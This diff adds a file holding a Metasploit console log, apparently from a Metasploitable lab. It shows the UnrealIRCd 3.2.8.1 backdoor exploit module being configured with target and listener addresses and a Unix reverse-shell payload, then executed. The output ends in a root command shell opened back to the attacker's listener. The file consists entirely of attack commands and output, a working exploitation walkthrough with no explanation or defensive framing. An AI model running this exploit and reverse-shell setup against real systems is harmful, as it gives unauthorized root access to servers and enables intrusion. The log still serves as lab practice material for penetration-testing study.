@@ -1,0 +1,48 @@
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options 
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.38     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   6667             yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.39     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit 
+
+[*] Started reverse TCP double handler on 192.168.1.39:4444 
+[*] 192.168.1.38:6667 - Connected to 192.168.1.38:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] 192.168.1.38:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 760zPRXenaN271Ap;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "760zPRXenaN271Ap\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 5 opened (192.168.1.39:4444 -> 192.168.1.38:47171 ) at 2021-12-19 00:56:44 -0500
+
+id
+uid=0(root) gid=0(root)
+
+
